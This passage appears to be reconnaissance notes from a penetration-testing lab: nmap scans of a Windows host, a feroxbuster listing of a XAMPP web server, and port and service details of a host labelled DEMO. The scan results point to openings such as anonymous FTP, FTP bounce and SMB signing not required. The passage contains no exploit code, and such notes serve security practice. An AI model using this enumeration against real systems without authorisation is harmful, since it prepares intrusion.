| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-18T15:11:29+00:00
|_ssl-date: 2025-08-18T15:11:36+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14020/tcp open  ftp           syn-ack ttl 125 FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
14080/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1607 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows Server 2012 Data Center (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=80%CT=%CU=38315%PV=Y%DS=4%DC=T%G=N%TM=68A342AA%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=107%TI=I%CI=I%TS=A)
SEQ(SP=108%GCD=1%ISR=109%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.005 days (since Mon Aug 18 11:04:46 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-18T15:11:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45663/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44879/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41639/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44785/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

```
### feroxbuster
```
http://192.168.146.247/js/scripts.js
http://192.168.146.247/img/module_table_top.png
http://192.168.146.247/img/module_table_bottom.png
http://192.168.146.247/pdfs/WelcomeLetter.pdf
http://192.168.146.247/css/styles.css
http://192.168.146.247/pdfs/New-Hire-Form.pdf
http://192.168.146.247/assets/favicon.ico
http://192.168.146.247/pdfs/Mission.pdf
http://192.168.146.247/
http://192.168.146.247/pdfs/Policies%20(2).pdf
http://192.168.146.247/assets/welcome.png
http://192.168.146.247/CSS/styles.css
http://192.168.146.247/dashboard/images/bitnami-xampp.png
http://192.168.146.247/dashboard/images/xampp-logo.svg
http://192.168.146.247/dashboard/images/social-icons@2x.png
http://192.168.146.247/dashboard/images/background.png
http://192.168.146.247/dashboard/images/fastly-logo.png
http://192.168.146.247/dashboard/images/social-icons-large.png
http://192.168.146.247/dashboard/images/social-icons-large@2x.png
http://192.168.146.247/dashboard/images/xampp-cloud.png
http://192.168.146.247/dashboard/images/addons-video-thumb.png
http://192.168.146.247/dashboard/images/social-icons.png
http://192.168.146.247/dashboard/images/fastly-logo@2x.png
http://192.168.146.247/dashboard/images/sourceforge-logo@2x.png
http://192.168.146.247/dashboard/images/sourceforge-logo.png
http://192.168.146.247/dashboard/images/apple-logo.png
http://192.168.146.247/dashboard/images/xampp-newsletter-logo.png
http://192.168.146.247/dashboard/images/pdf-icon.png
http://192.168.146.247/dashboard/images/linux-logo.png
http://192.168.146.247/dashboard/images/windows-logo.png
http://192.168.146.247/dashboard/images/favicon.png
http://192.168.146.247/JS/scripts.js
http://192.168.146.247/dashboard/images/xampp-cloud@2x.png
http://192.168.146.247/dashboard/images/middleman.png
http://192.168.146.247/dashboard/images/stack-icons.png
http://192.168.146.247/dashboard/images/stack-icons@2x.png
http://192.168.146.247/dashboard/images/twitter-bird.png
http://192.168.146.247/dashboard/docs/use-php-fcgi.html
http://192.168.146.247/dashboard/docs/configure-use-tomcat.pdfmarks
http://192.168.146.247/dashboard/docs/change-mysql-temp-dir.pdfmarks
http://192.168.146.247/dashboard/docs/install-wordpress.pdfmarks
http://192.168.146.247/dashboard/docs/troubleshoot-apache.pdfmarks
http://192.168.146.247/dashboard/docs/create-framework-project-zf1.pdfmarks
http://192.168.146.247/dashboard/docs/increase-php-file-upload-limit.pdfmarks
http://192.168.146.247/dashboard/docs/auto-start-xampp.pdfmarks
http://192.168.146.247/dashboard/docs/configure-wildcard-subdomains.pdfmarks
http://192.168.146.247/dashboard/docs/configure-vhosts.pdfmarks
http://192.168.146.247/dashboard/docs/reset-mysql-password.pdfmarks
http://192.168.146.247/dashboard/docs/transfer-files-ftp.pdfmarks
http://192.168.146.247/dashboard/docs/deploy-git-app.pdfmarks
http://192.168.146.247/dashboard/docs/reset-mysql-password.html
http://192.168.146.247/dashboard/docs/transfer-files-ftp.html
http://192.168.146.247/dashboard/docs/activate-use-xdebug.html
http://192.168.146.247/dashboard/docs/auto-start-xampp.html
http://192.168.146.247/dashboard/docs/configure-use-tomcat.html
http://192.168.146.247/dashboard/docs/deploy-git-app.html
http://192.168.146.247/dashboard/docs/send-mail.html
http://192.168.146.247/dashboard/docs/increase-php-file-upload-limit.pdf
http://192.168.146.247/dashboard/docs/access-phpmyadmin-remotely.html
http://192.168.146.247/dashboard/docs/access-phpmyadmin-remotely.pdfmarks
http://192.168.146.247/dashboard/docs/use-sqlite.pdfmarks
http://192.168.146.247/dashboard/docs/change-mysql-temp-dir.html
http://192.168.146.247/dashboard/docs/send-mail.pdfmarks
http://192.168.146.247/dashboard/docs/configure-vhosts.html
http://192.168.146.247/dashboard/docs/create-framework-project-zf2.html
http://192.168.146.247/dashboard/docs/backup-restore-mysql.html
http://192.168.146.247/dashboard/docs/change-mysql-temp-dir.pdf
http://192.168.146.247/dashboard/docs/troubleshoot-apache.html
http://192.168.146.247/Assets/favicon.ico
http://192.168.146.247/dashboard/docs/auto-start-xampp.pdf
http://192.168.146.247/dashboard/docs/install-wordpress.html
http://192.168.146.247/dashboard/docs/use-php-fcgi.pdfmarks
http://192.168.146.247/dashboard/docs/activate-use-xdebug.pdfmarks
http://192.168.146.247/dashboard/docs/backup-restore-mysql.pdfmarks
http://192.168.146.247/dashboard/docs/use-different-php-version.pdfmarks
http://192.168.146.247/dashboard/docs/create-framework-project-zf2.pdfmarks
http://192.168.146.247/dashboard/docs/increase-php-file-upload-limit.html
http://192.168.146.247/dashboard/docs/access-phpmyadmin-remotely.pdf
http://192.168.146.247/dashboard/docs/use-php-fcgi.pdf
http://192.168.146.247/dashboard/docs/reset-mysql-password.pdf
http://192.168.146.247/dashboard/docs/use-sqlite.pdf
http://192.168.146.247/dashboard/docs/configure-wildcard-subdomains.pdf
http://192.168.146.247/dashboard/docs/create-framework-project-zf1.pdf
http://192.168.146.247/dashboard/Images/sourceforge-logo.png
http://192.168.146.247/dashboard/Images/bitnami-xampp.png
http://192.168.146.247/dashboard/Images/fastly-logo.png
http://192.168.146.247/dashboard/Images/middleman.png
http://192.168.146.247/dashboard/Images/stack-icons.png
http://192.168.146.247/dashboard/Images/background.png
http://192.168.146.247/dashboard/docs/configure-vhosts.pdf
http://192.168.146.247/dashboard/Images/xampp-newsletter-logo.png
http://192.168.146.247/dashboard/Images/addons-video-thumb.png
http://192.168.146.247/dashboard/Images/windows-logo.png
http://192.168.146.247/dashboard/Images/favicon.png
http://192.168.146.247/dashboard/Images/social-icons-large@2x.png
http://192.168.146.247/dashboard/Images/xampp-logo.svg
http://192.168.146.247/dashboard/Images/social-icons@2x.png
http://192.168.146.247/dashboard/Images/pdf-icon.png
http://192.168.146.247/dashboard/docs/deploy-git-app.pdf
http://192.168.146.247/dashboard/docs/transfer-files-ftp.pdf
http://192.168.146.247/dashboard/Images/xampp-cloud@2x.png
http://192.168.146.247/dashboard/docs/use-different-php-version.html
http://192.168.146.247/dashboard/docs/activate-use-xdebug.pdf
http://192.168.146.247/dashboard/docs/use-sqlite.html
http://192.168.146.247/dashboard/docs/backup-restore-mysql.pdf
http://192.168.146.247/dashboard/docs/send-mail.pdf
http://192.168.146.247/dashboard/docs/install-wordpress.pdf
http://192.168.146.247/Assets/welcome.png
http://192.168.146.247/dashboard/docs/use-different-php-version.pdf
http://192.168.146.247/dashboard/stylesheets/normalize.css
http://192.168.146.247/Js/scripts.js
http://192.168.146.247/dashboard/javascripts/modernizr.js
http://192.168.146.247/dashboard/stylesheets/asciidoctor.css
http://192.168.146.247/Css/styles.css
http://192.168.146.247/dashboard/stylesheets/all.css
http://192.168.146.247/dashboard/docs/create-framework-project-zf2.pdf
http://192.168.146.247/dashboard/stylesheets/all-rtl.css
http://192.168.146.247/dashboard/javascripts/all.js
http://192.168.146.247/dashboard/docs/troubleshoot-apache.pdf
http://192.168.146.247/PDFs/WelcomeLetter.pdf
http://192.168.146.247/PDFs/New-Hire-Form.pdf
http://192.168.146.247/PDFs/Mission.pdf
http://192.168.146.247/PDFs/Policies%20(2).pdf
http://192.168.146.247/IMG/module_table_top.png
http://192.168.146.247/IMG/module_table_bottom.png
http://192.168.146.247/Img/module_table_bottom.png
http://192.168.146.247/Img/module_table_top.png
http://192.168.146.247/dashboard/docs/create-framework-project-zf1.html
http://192.168.146.247/dashboard/docs/configure-wildcard-subdomains.html
http://192.168.146.247/dashboard/
http://192.168.146.247/dashboard/Images/fastly-logo@2x.png
http://192.168.146.247/dashboard/Images/social-icons-large.png
http://192.168.146.247/dashboard/Images/sourceforge-logo@2x.png
http://192.168.146.247/dashboard/docs/configure-use-tomcat.pdf
http://192.168.146.247/dashboard/es/
http://192.168.146.247/dashboard/it/
http://192.168.146.247/dashboard/pl/
http://192.168.146.247/dashboard/de/
http://192.168.146.247/dashboard/tr/
http://192.168.146.247/dashboard/ro/
http://192.168.146.247/dashboard/Docs/access-phpmyadmin-remotely.html
http://192.168.146.247/dashboard/Docs/change-mysql-temp-dir.html
http://192.168.146.247/dashboard/Docs/use-sqlite.pdfmarks
http://192.168.146.247/dashboard/Docs/increase-php-file-upload-limit.html
http://192.168.146.247/dashboard/Docs/auto-start-xampp.html
http://192.168.146.247/dashboard/Docs/use-php-fcgi.pdf
http://192.168.146.247/dashboard/Docs/use-different-php-version.pdfmarks
http://192.168.146.247/dashboard/Docs/deploy-git-app.html
http://192.168.146.247/dashboard/Docs/configure-use-tomcat.html
http://192.168.146.247/dashboard/Docs/troubleshoot-apache.html
http://192.168.146.247/dashboard/Docs/create-framework-project-zf1.html
http://192.168.146.247/dashboard/Docs/create-framework-project-zf2.html
http://192.168.146.247/dashboard/Docs/change-mysql-temp-dir.pdf
http://192.168.146.247/dashboard/Docs/reset-mysql-password.html
http://192.168.146.247/dashboard/Docs/change-mysql-temp-dir.pdfmarks
http://192.168.146.247/dashboard/Docs/activate-use-xdebug.pdf
http://192.168.146.247/dashboard/Docs/use-php-fcgi.pdfmarks
http://192.168.146.247/dashboard/Docs/configure-wildcard-subdomains.pdfmarks
http://192.168.146.247/dashboard/Docs/deploy-git-app.pdfmarks
http://192.168.146.247/dashboard/Docs/troubleshoot-apache.pdfmarks
http://192.168.146.247/dashboard/Docs/use-sqlite.html
http://192.168.146.247/dashboard/Docs/increase-php-file-upload-limit.pdf
http://192.168.146.247/dashboard/Docs/install-wordpress.html
http://192.168.146.247/dashboard/Docs/auto-start-xampp.pdf
http://192.168.146.247/dashboard/Docs/configure-use-tomcat.pdfmarks
http://192.168.146.247/dashboard/Docs/activate-use-xdebug.html
http://192.168.146.247/dashboard/Docs/use-different-php-version.pdf
http://192.168.146.247/dashboard/Docs/transfer-files-ftp.html
http://192.168.146.247/dashboard/Docs/send-mail.html
http://192.168.146.247/dashboard/Docs/use-sqlite.pdf
http://192.168.146.247/dashboard/Docs/install-wordpress.pdfmarks
http://192.168.146.247/dashboard/Docs/configure-vhosts.pdfmarks
http://192.168.146.247/dashboard/Docs/send-mail.pdfmarks
http://192.168.146.247/dashboard/Docs/access-phpmyadmin-remotely.pdf
http://192.168.146.247/dashboard/Docs/transfer-files-ftp.pdfmarks
http://192.168.146.247/dashboard/Docs/activate-use-xdebug.pdfmarks
http://192.168.146.247/dashboard/Docs/reset-mysql-password.pdfmarks
http://192.168.146.247/dashboard/Docs/use-different-php-version.html
http://192.168.146.247/dashboard/Docs/access-phpmyadmin-remotely.pdfmarks
http://192.168.146.247/dashboard/Docs/create-framework-project-zf1.pdf
http://192.168.146.247/dashboard/Docs/reset-mysql-password.pdf
http://192.168.146.247/dashboard/Docs/create-framework-project-zf2.pdf
http://192.168.146.247/dashboard/Docs/backup-restore-mysql.html
http://192.168.146.247/dashboard/Docs/use-php-fcgi.html
http://192.168.146.247/dashboard/Docs/configure-wildcard-subdomains.html
http://192.168.146.247/dashboard/Docs/increase-php-file-upload-limit.pdfmarks
http://192.168.146.247/dashboard/Docs/configure-vhosts.html
http://192.168.146.247/dashboard/Docs/create-framework-project-zf2.pdfmarks
http://192.168.146.247/dashboard/Docs/create-framework-project-zf1.pdfmarks
http://192.168.146.247/dashboard/Docs/auto-start-xampp.pdfmarks
http://192.168.146.247/dashboard/Docs/backup-restore-mysql.pdfmarks
http://192.168.146.247/dashboard/Docs/backup-restore-mysql.pdf
http://192.168.146.247/dashboard/Docs/transfer-files-ftp.pdf
http://192.168.146.247/dashboard/Docs/deploy-git-app.pdf
http://192.168.146.247/dashboard/Docs/configure-wildcard-subdomains.pdf
http://192.168.146.247/dashboard/Docs/send-mail.pdf
http://192.168.146.247/dashboard/Docs/troubleshoot-apache.pdf
http://192.168.146.247/dashboard/Docs/install-wordpress.pdf
http://192.168.146.247/dashboard/Docs/configure-use-tomcat.pdf
http://192.168.146.247/dashboard/hu/
http://192.168.146.247/dashboard/Docs/configure-vhosts.pdf
http://192.168.146.247/dashboard/IMAGES/social-icons-large@2x.png
http://192.168.146.247/dashboard/IMAGES/linux-logo.png
http://192.168.146.247/dashboard/IMAGES/stack-icons@2x.png
http://192.168.146.247/dashboard/IMAGES/social-icons.png
http://192.168.146.247/dashboard/IMAGES/fastly-logo@2x.png
http://192.168.146.247/dashboard/IMAGES/xampp-newsletter-logo.png
http://192.168.146.247/dashboard/IMAGES/favicon.png
http://192.168.146.247/dashboard/IMAGES/sourceforge-logo.png
http://192.168.146.247/dashboard/IMAGES/apple-logo.png
http://192.168.146.247/dashboard/IMAGES/social-icons-large.png
http://192.168.146.247/dashboard/IMAGES/fastly-logo.png
http://192.168.146.247/dashboard/IMAGES/windows-logo.png
http://192.168.146.247/dashboard/IMAGES/middleman.png
http://192.168.146.247/dashboard/IMAGES/addons-video-thumb.png
http://192.168.146.247/dashboard/IMAGES/pdf-icon.png
http://192.168.146.247/dashboard/IMAGES/xampp-logo.svg
http://192.168.146.247/dashboard/IMAGES/stack-icons.png
http://192.168.146.247/dashboard/IMAGES/social-icons@2x.png
http://192.168.146.247/dashboard/IMAGES/background.png
http://192.168.146.247/dashboard/IMAGES/sourceforge-logo@2x.png
http://192.168.146.247/dashboard/IMAGES/xampp-cloud@2x.png
http://192.168.146.247/dashboard/IMAGES/bitnami-xampp.png
http://192.168.146.247/dashboard/IMAGES/xampp-cloud.png
http://192.168.146.247/dashboard/IMAGES/twitter-bird.png
http://192.168.146.247/dashboard/FR/
http://192.168.146.247/dashboard/IT/
http://192.168.146.247/dashboard/DE/
http://192.168.146.247/dashboard/StyleSheets/normalize.css
http://192.168.146.247/dashboard/StyleSheets/asciidoctor.css
http://192.168.146.247/dashboard/StyleSheets/all.css
http://192.168.146.247/Dashboard/images/windows-logo.png
http://192.168.146.247/Dashboard/images/linux-logo.png
http://192.168.146.247/Dashboard/images/fastly-logo@2x.png
http://192.168.146.247/Dashboard/images/sourceforge-logo@2x.png
http://192.168.146.247/Dashboard/images/favicon.png
http://192.168.146.247/Dashboard/images/xampp-cloud.png
http://192.168.146.247/Dashboard/images/middleman.png
http://192.168.146.247/Dashboard/images/sourceforge-logo.png
http://192.168.146.247/dashboard/StyleSheets/all-rtl.css
http://192.168.146.247/Dashboard/docs/transfer-files-ftp.pdfmarks
http://192.168.146.247/Dashboard/docs/troubleshoot-apache.html
http://192.168.146.247/Dashboard/docs/send-mail.html
http://192.168.146.247/Dashboard/docs/create-framework-project-zf2.html
http://192.168.146.247/Dashboard/docs/use-sqlite.pdfmarks
http://192.168.146.247/Dashboard/docs/activate-use-xdebug.html
http://192.168.146.247/Dashboard/docs/activate-use-xdebug.pdfmarks
http://192.168.146.247/Dashboard/docs/increase-php-file-upload-limit.pdf
http://192.168.146.247/Dashboard/docs/create-framework-project-zf1.pdfmarks
http://192.168.146.247/Dashboard/docs/use-sqlite.html
http://192.168.146.247/Dashboard/docs/create-framework-project-zf2.pdfmarks
http://192.168.146.247/Dashboard/docs/access-phpmyadmin-remotely.pdfmarks
http://192.168.146.247/Dashboard/docs/deploy-git-app.html
http://192.168.146.247/Dashboard/docs/transfer-files-ftp.html
http://192.168.146.247/Dashboard/docs/backup-restore-mysql.html
http://192.168.146.247/Dashboard/docs/access-phpmyadmin-remotely.html
http://192.168.146.247/Dashboard/docs/reset-mysql-password.pdfmarks
http://192.168.146.247/Dashboard/docs/reset-mysql-password.html
http://192.168.146.247/Dashboard/docs/change-mysql-temp-dir.pdfmarks
http://192.168.146.247/Dashboard/docs/use-different-php-version.html
http://192.168.146.247/Dashboard/docs/use-sqlite.pdf
http://192.168.146.247/Dashboard/docs/send-mail.pdf
http://192.168.146.247/Dashboard/docs/create-framework-project-zf1.pdf
http://192.168.146.247/Dashboard/docs/use-php-fcgi.pdf
http://192.168.146.247/Dashboard/docs/install-wordpress.html
http://192.168.146.247/Dashboard/docs/configure-use-tomcat.pdfmarks
http://192.168.146.247/Dashboard/docs/auto-start-xampp.html
http://192.168.146.247/Dashboard/docs/increase-php-file-upload-limit.pdfmarks
http://192.168.146.247/Dashboard/docs/configure-vhosts.html
http://192.168.146.247/Dashboard/docs/troubleshoot-apache.pdfmarks
http://192.168.146.247/Dashboard/docs/backup-restore-mysql.pdfmarks
http://192.168.146.247/Dashboard/docs/configure-use-tomcat.html
http://192.168.146.247/Dashboard/docs/configure-use-tomcat.pdf
http://192.168.146.247/Dashboard/docs/activate-use-xdebug.pdf
http://192.168.146.247/Dashboard/docs/deploy-git-app.pdf
http://192.168.146.247/Dashboard/docs/create-framework-project-zf2.pdf
http://192.168.146.247/Dashboard/docs/transfer-files-ftp.pdf
http://192.168.146.247/Dashboard/docs/install-wordpress.pdf
http://192.168.146.247/Dashboard/Images/apple-logo.png
http://192.168.146.247/Dashboard/Images/fastly-logo@2x.png
http://192.168.146.247/Dashboard/Images/middleman.png
http://192.168.146.247/Dashboard/Images/windows-logo.png
http://192.168.146.247/Dashboard/Images/xampp-newsletter-logo.png
http://192.168.146.247/Dashboard/Images/xampp-cloud@2x.png
http://192.168.146.247/Dashboard/Images/social-icons.png
http://192.168.146.247/Dashboard/Images/bitnami-xampp.png
http://192.168.146.247/Dashboard/Images/pdf-icon.png
http://192.168.146.247/Dashboard/Images/social-icons@2x.png
http://192.168.146.247/Dashboard/es/
http://192.168.146.247/Dashboard/it/
http://192.168.146.247/dashboard/ur/
http://192.168.146.247/dashboard/Stylesheets/normalize.css
http://192.168.146.247/dashboard/Stylesheets/asciidoctor.css
http://192.168.146.247/dashboard/Stylesheets/all.css
http://192.168.146.247/Dashboard/Docs/use-different-php-version.pdfmarks
http://192.168.146.247/Dashboard/Docs/auto-start-xampp.html
http://192.168.146.247/Dashboard/Docs/change-mysql-temp-dir.pdf
http://192.168.146.247/Dashboard/Docs/use-php-fcgi.pdfmarks
http://192.168.146.247/Dashboard/Docs/reset-mysql-password.html
http://192.168.146.247/Dashboard/Docs/increase-php-file-upload-limit.pdf
http://192.168.146.247/Dashboard/Docs/backup-restore-mysql.html
http://192.168.146.247/Dashboard/Docs/install-wordpress.pdfmarks
http://192.168.146.247/Dashboard/Docs/configure-vhosts.html
http://192.168.146.247/Dashboard/Docs/reset-mysql-password.pdfmarks
http://192.168.146.247/Dashboard/Docs/use-sqlite.html
http://192.168.146.247/Dashboard/Docs/deploy-git-app.pdfmarks
http://192.168.146.247/Dashboard/Docs/deploy-git-app.html
http://192.168.146.247/Dashboard/Docs/use-php-fcgi.html
http://192.168.146.247/Dashboard/Docs/create-framework-project-zf1.html
http://192.168.146.247/Dashboard/Docs/access-phpmyadmin-remotely.html
http://192.168.146.247/Dashboard/Docs/activate-use-xdebug.pdfmarks
http://192.168.146.247/Dashboard/Docs/change-mysql-temp-dir.html
http://192.168.146.247/Dashboard/Docs/auto-start-xampp.pdfmarks
http://192.168.146.247/Dashboard/Docs/send-mail.pdfmarks
http://192.168.146.247/Dashboard/Docs/create-framework-project-zf1.pdfmarks
http://192.168.146.247/Dashboard/Docs/increase-php-file-upload-limit.html
http://192.168.146.247/Dashboard/Docs/configure-use-tomcat.html
http://192.168.146.247/Dashboard/Docs/install-wordpress.html
http://192.168.146.247/Dashboard/Docs/configure-vhosts.pdfmarks
http://192.168.146.247/Dashboard/Docs/create-framework-project-zf2.pdfmarks
http://192.168.146.247/Dashboard/Docs/change-mysql-temp-dir.pdfmarks
http://192.168.146.247/Dashboard/Docs/configure-wildcard-subdomains.html
http://192.168.146.247/Dashboard/Docs/configure-wildcard-subdomains.pdfmarks
http://192.168.146.247/Dashboard/Docs/use-php-fcgi.pdf
http://192.168.146.247/Dashboard/Docs/activate-use-xdebug.html
http://192.168.146.247/Dashboard/Docs/access-phpmyadmin-remotely.pdfmarks
http://192.168.146.247/Dashboard/Docs/use-different-php-version.pdf
http://192.168.146.247/Dashboard/Docs/create-framework-project-zf1.pdf
http://192.168.146.247/Dashboard/Docs/activate-use-xdebug.pdf
http://192.168.146.247/Dashboard/Docs/use-sqlite.pdf
http://192.168.146.247/Dashboard/Docs/auto-start-xampp.pdf
http://192.168.146.247/Dashboard/Docs/deploy-git-app.pdf
http://192.168.146.247/Dashboard/Docs/backup-restore-mysql.pdfmarks
http://192.168.146.247/Dashboard/Docs/use-sqlite.pdfmarks
http://192.168.146.247/Dashboard/Docs/transfer-files-ftp.html
http://192.168.146.247/Dashboard/Docs/send-mail.html
http://192.168.146.247/Dashboard/Docs/troubleshoot-apache.pdfmarks
http://192.168.146.247/Dashboard/Docs/access-phpmyadmin-remotely.pdf
http://192.168.146.247/Dashboard/Docs/troubleshoot-apache.html
http://192.168.146.247/Dashboard/Docs/use-different-php-version.html
http://192.168.146.247/Dashboard/Docs/configure-use-tomcat.pdfmarks
http://192.168.146.247/Dashboard/Docs/increase-php-file-upload-limit.pdfmarks
http://192.168.146.247/Dashboard/Docs/transfer-files-ftp.pdfmarks
http://192.168.146.247/Dashboard/Docs/create-framework-project-zf2.pdf
http://192.168.146.247/Dashboard/Docs/configure-wildcard-subdomains.pdf
http://192.168.146.247/Dashboard/Docs/configure-vhosts.pdf
http://192.168.146.247/Dashboard/Docs/transfer-files-ftp.pdf
http://192.168.146.247/Dashboard/Docs/reset-mysql-password.pdf
http://192.168.146.247/Dashboard/Docs/backup-restore-mysql.pdf
http://192.168.146.247/Dashboard/Docs/configure-use-tomcat.pdf
http://192.168.146.247/Dashboard/Docs/create-framework-project-zf2.html
http://192.168.146.247/Dashboard/Docs/troubleshoot-apache.pdf
http://192.168.146.247/Dashboard/Docs/install-wordpress.pdf
http://192.168.146.247/Dashboard/Docs/send-mail.pdf
http://192.168.146.247/Dashboard/DE/
http://192.168.146.247/Dashboard/IMAGES/sourceforge-logo@2x.png
http://192.168.146.247/Dashboard/IMAGES/linux-logo.png
http://192.168.146.247/Dashboard/IMAGES/addons-video-thumb.png
http://192.168.146.247/Dashboard/IMAGES/social-icons-large.png
http://192.168.146.247/Dashboard/IMAGES/social-icons.png
http://192.168.146.247/Dashboard/IMAGES/favicon.png
http://192.168.146.247/Dashboard/IMAGES/xampp-cloud.png
http://192.168.146.247/Dashboard/IMAGES/pdf-icon.png
http://192.168.146.247/Dashboard/IMAGES/stack-icons@2x.png
http://192.168.146.247/Dashboard/IT/
http://192.168.146.247/Dashboard/ur/
http://192.168.146.247/Dashboard/StyleSheets/normalize.css
http://192.168.146.247/Dashboard/StyleSheets/asciidoctor.css
http://192.168.146.247/Dashboard/StyleSheets/all-rtl.css
http://192.168.146.247/Dashboard/StyleSheets/all.css
http://192.168.146.247/dashboard/DOCS/Images/
http://192.168.146.247/Pdfs/WelcomeLetter.pdf
http://192.168.146.247/Pdfs/New-Hire-Form.pdf
http://192.168.146.247/Pdfs/Mission.pdf
http://192.168.146.247/dashboard/pt_BR/
http://192.168.146.247/WEBALIZER/
http://192.168.146.247/dashboard/zh_tw/

```
## 246 DEMO
### open ports
```
Open 192.168.102.246:80
Open 192.168.102.246:443
Open 192.168.102.246:2222
```
### port details
```
PORT     STATE SERVICE  REASON         VERSION
80/tcp   open  http     syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Code Validation
|_http-server-header: Apache/2.4.52 (Ubuntu)
443/tcp  open  ssl/http syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Code Validation
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=demo
| Subject Alternative Name: DNS:demo
| Issuer: commonName=demo
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-10-12T07:46:27
| Not valid after:  2032-10-09T07:46:27
| MD5:   6361:be08:5259:3a75:cd26:f869:1614:3c94
| SHA-1: 8fa0:04a7:5d03:4c29:44b7:6b14:119f:fd79:3c7e:5093
| -----BEGIN CERTIFICATE-----
| MIIC6TCCAdGgAwIBAgIUIN3Z/giwrWikVN/gzzofa98CJ1AwDQYJKoZIhvcNAQEL
| BQAwDzENMAsGA1UEAwwEZGVtbzAeFw0yMjEwMTIwNzQ2MjdaFw0zMjEwMDkwNzQ2
| MjdaMA8xDTALBgNVBAMMBGRlbW8wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQCMPw2+IkC55uip8gDmvy+mN/FtQJBck6audIht6POsdrE2GzfhAoxZY9al
| XkTc3WPOxP2X1I4ea1t1y8SQuX7jomUlNOgkGtVbj+RYzU8Qau7XWSTBMbVkRluc
| B+w5vPsGL1XGMd35V7Td6ZhotXLwc0j19smwewETujURfSmGCKdwbHztKozyW9Qg
| QFOtNI4gOHpvMxTYpR3QDkBYvIzaH+FaU8xqrr/GJiFSz8MUhxVPSM2QyqSmsFyE
| HYijIDbxBNRyf1lAmReLdwpwGqpRvBF1wYfpYyTvjW/j0LQPfvCcCVxD1v/3N3oK
| VR4/EYqBrCr9umF7Q3w5E4hC0x5VAgMBAAGjPTA7MAkGA1UdEwQCMAAwDwYDVR0R
| BAgwBoIEZGVtbzAdBgNVHQ4EFgQUqWpscb2cgQbMGE4Nh4vVDLAs55EwDQYJKoZI
| hvcNAQELBQADggEBACvVHEqW54LzwFNKfLMlbbrSitnXhGc1zgOaYdBnF95weO3j
| 5gEbGNElednFgWQEZzLz5ruS9i0aiKsQYKuh+AL+QQRdycfCbTxDVTopO9sxFYGd
